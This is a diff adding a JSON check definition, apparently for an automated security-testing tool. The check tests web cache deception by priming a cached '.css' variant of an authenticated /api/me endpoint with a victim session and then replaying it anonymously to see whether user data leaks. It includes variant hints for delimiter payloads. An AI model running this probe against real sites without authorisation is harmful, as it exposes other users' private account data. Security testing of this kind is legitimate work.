@@ -1,0 +1,46 @@
+{
+  "name": "elite/Web cache deception authenticated leak",
+  "description": "[high] Web cache deception (Reaboi; PortSwigger Black Hat USA 2024 'Gotta cache 'em all'): the victim's session primes a static-extension URL of an auth-gated endpoint; the cache stores the AUTHENTICATED response; an anonymous replay of the same URL gets 200 + user data while the anonymous direct request is denied. Keywords: cache deception static extension authenticated leak cache buster path mapping. SETUP: store the victim session under label 'victim' BEFORE calling, and call apply_skill WITHOUT a session_label argument (requests carry their own). ctrl: anonymous fresh-buster URL misses the cache -> 401 -> not falsified. base_url = site root; copy skill for delimiter variants (/api/me;qxd7.css) and 403-deny targets.",
+  "cwe": "CWE-441",
+  "requests": {
+    "prime": {
+      "method": "GET",
+      "url": "{{base_url}}/api/me/qxd7cache.css",
+      "session_label": "victim"
+    },
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/api/me/qxd7cache.css"
+    },
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/api/me"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 401
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "(?:email|username|\"user\"|\"account\"|\"balance\")",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "b6796401c958",
+  "created": "2026-11-05T18:20:19.655790+00:00",
+  "last_used": "2026-11-05T18:20:19.655790+00:00"
+}
